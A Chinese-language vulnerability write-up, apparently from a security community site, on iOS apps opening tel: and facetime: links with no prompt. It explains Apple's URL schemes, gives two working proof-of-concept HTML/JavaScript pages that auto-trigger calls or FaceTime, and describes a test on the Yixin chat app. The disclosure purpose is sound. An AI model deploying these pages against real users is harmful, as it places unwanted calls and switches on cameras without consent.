# iOS应用自动拨打电话，开启摄像头缺陷

0x00 背景
-------

* * *

国外一安全研究者发现该缺陷，在iOS设备上的某些应用里（其测试的Google+、Facebook Messenger、Gmail都成功触发），当用户点击了构造好的链接时，会自动拨打电话，或开启facetime，从而打开前置摄像头，且无任何提醒。缺陷产生的原因是开发者没有看清官方开发文档对于Phone Links和FaceTime Links中这样的一条说明，“当用户在本地应用里打开该类型的链接时，iOS并不展示提醒窗口"，从而导致缺陷的产生。

0x01 缺陷描述
---------

* * *

查看苹果官方文档，对于URL方案的规定大致有如下几种类型：

### 1）Mail Links（发送邮件）

点击该类型的链接后，会自动调用邮件应用，且mailto URL必须指定一个收件地址。

网页链接中的字符串格式如下

```
<a href="mailto:frank@wwdcdemo.example.com">John Frank</a>

```

本地应用上的URL字符串格式为

```
mailto:frank@wwdcdemo.example.com

```

当然也可以在字符串中添加主题等内容，比如

```
mailto:foo@example.com?cc=bar@example.com&subject=Greetings%20from%20Cupertino!&body=Wish%20you%20were%20here!

```

具体的mailto格式可以查看RFC文档

[http://www.ietf.org/rfc/rfc2368.txt](http://www.ietf.org/rfc/rfc2368.txt)

### 2）Phone Links（拨打电话）

tel类型的URL是用来开启iOS设备上拨打电话的应用，并且拨打指定的号码。当用户在网页中点击了一个该类型的链接时，iOS设备会弹出提醒窗口，询问用户是否拨打该号码，若用户同意则开始拨打电话。但是当用户在本地应用里打开该类型的链接时，iOS并不展示提醒窗口，而是直接拨打指定的电话。当然本地应用可以配置是否显示提醒。

比如在网页中嵌入一个a标签，内容为

```
<a href="tel:10086">fuck it</a>

```

那么访问该页面，点击fuck it链接后自动弹出拨打电话的提醒。如图1

![2014082711012276720.png](http://drops.javaweb.org/uploads/images/c8a2b9a9ae1c53957cb53385c607c1add19fb335.jpg)

官方文档同时给出了本地应用里的url形式，本地应用中URL字符串为tel:1-408-555-5555

在短信页面输入tel://10086点击后会提示拨打电话，如图2

![2014082711020263770.png](http://drops.javaweb.org/uploads/images/4925c04a44666ecdc43a32e8a74ea49898837848.jpg)

同时防止恶意的请求，链接里包含* #字符时，系统并不会拨打该号码。而且iOS上的电话号码的识别检测是默认开启的，如果想让网页上包含的数字不被识别为手机号码，则需要在网页中加入如下的标签

```
<meta name = "format-detection" content = "telephone=no">

```

具体的URL方案可以查看如下RFC文档，

[http://www.ietf.org/rfc/rfc2396.txt](http://www.ietf.org/rfc/rfc2396.txt)[http://www.ietf.org/rfc/rfc2806.txt](http://www.ietf.org/rfc/rfc2806.txt)

### 3）FaceTime Links（开启facetime，开启前置摄像头）

FaceTime类型的URL是用来调用FaceTime应用拨打指定的用户，可以是电话号码或者是绑定的邮箱地址。当用户在网页里点开FaceTime类型的URL时，系统会提示是否拨打；但是当在本地应用里点击该类型的URL时，iOS直接开启FaceTime应用拨打电话，而无提醒。本地应用可以配置是否显示提醒。 网页中的链接格式为

```
<a href="facetime:14085551234">Connect using FaceTime</a>
<a href="facetime:user@example.com">Connect using FaceTime</a>

```

本地应用中URL字符串为

```
facetime:// 14085551234
facetime://user@example.com

```

当然防止恶意请求，链接里包含* #字符时，系统并不会拨打该号码。而且iOS7之前的系统，用该协议拨打电话时候，是用的默认普通的拨打电话的应用而不是FaceTime应用

### 4）SMS Links（发送短信）

SMS方案是用来打开短信应用，其URL格式如下sms:其中指定目标用户的号码，可以包含0到9的数组和+-.三个字符，并且URL字符串不能包含任何其他的文本信息

网页中的链接格式为

```
<a href="sms:">Launch Messages App</a>
<a href="sms:1-408-555-1212">New SMS Message</a>

```

本地应用中URL字符串为

```
sms:1-408-555-1212

```

### 5）其他类型的Links

其他像Map Links（打开地图）、iTunes Links（打开iTunes）、YouTube Links（打开YouTube）等不一一介绍，是点击指定的链接后打开相应的地图、iTunes应用等，详细查看苹果官方开发文档。

由上述的介绍可以看出，其中可以利用的有Phone Links和FaceTime Links。因为其中都有一条这样的描述，如果链接是在本地应用里，则点击的话会直接调用相关系统应用，而没有任何提醒。

即如果在应用里直接输入tel://xxxx、facetime://xxxx类似的字符，会直接调用相关拨号应用。同样我们可以在应用里输入网页链接，然后在网页内容里嵌入这样的a标签链接，然后利用js实现加载网页时自动点击该a标签链接。

所以具体的测试代码如下，将其保存为html文件即可。

```
<a id="target" href="facetime:HackForFreedom@fbi.com">click me</a> 
<script> 
var target = document.getElementById("target"); 
var fakeEvent = document.createEvent("MouseEvents"); 
fakeEvent.initEvent("click", true, false); 
target.dispatchEvent(fakeEvent); 
</script>

```

或者如下

```
<html>
<head>
    <title>v</title>
</head>
<body>
    <a id="dial" href="tel:10086">fuck it</a>
</body>
<script type="text/javascript">
<!--
window.onload = function()
{
    window.location.href = document.getElementById("dial").href;
};
//-->
</script>
</html>

```

tel:xxxxx表示要拨打的电话，点击该链接后则自动拨打电话；

facetiem:xxxxx表示拨打的facetime帐号，点击该链接后自动开启摄像头，无任何提醒；

> 注：其中第二个代码在某些应用里测试没有执行成功，第一个代码在应用里基本能执行成功。

0x02 案例测试
---------

* * *

测试了国内的几个常用的聊天类应用，基本都存在该缺陷，已经报告给厂商，修复可能需要一段时间。这里以在乌云上提交的易信为案例（官方将发布新版本）。 测试版本为iOS版本6.1.4、易信V2.9.0.1680

在朋友圈发布该url，如图3

![2014082711044861565.png](http://drops.javaweb.org/uploads/images/a9627f51dbca5723a152fcf33f01d21b3c22c68c.jpg)

好友点击后自动拨打电话或开启FaceTime，如图2、图3

![2014082711050945066.png](http://drops.javaweb.org/uploads/images/15fbe65f4b7b225aaeee767a1f856fee0fd8c1aa.jpg)

![2014082711052082517.png](http://drops.javaweb.org/uploads/images/b5f6ea03f0125f0747ce9736d7f00766357a1a90.jpg)

0x03 如何修复
---------

* * *

在苹果官方开发文档给出的说明上，在本地应用打开相应的URL是可以配置提醒设置的。所以可能是开发者对苹果URL的规范未全面了解，疏忽导致了该问题。由于未接触过iOS开发，所以具体的修复不清楚。:)

References：

[http://algorithm.dk/posts/rtfm-0day-in-ios-apps-g-gmail-fb-messenger-etc](http://algorithm.dk/posts/rtfm-0day-in-ios-apps-g-gmail-fb-messenger-etc)[https://developer.apple.com/library/ios/featuredarticles/iPhoneURLScheme_Reference/PhoneLinks/PhoneLinks.html#//apple_ref/doc/uid/TP40007899-CH6-SW1](https://developer.apple.com/library/ios/featuredarticles/iPhoneURLScheme_Reference/PhoneLinks/PhoneLinks.html#//apple_ref/doc/uid/TP40007899-CH6-SW1)[https://developer.apple.com/library/ios/featuredarticles/iPhoneURLScheme_Reference/PhoneLinks/PhoneLinks.html#//apple_ref/doc/uid/TP40007899-CH6-SW1](https://developer.apple.com/library/ios/featuredarticles/iPhoneURLScheme_Reference/PhoneLinks/PhoneLinks.html#//apple_ref/doc/uid/TP40007899-CH6-SW1)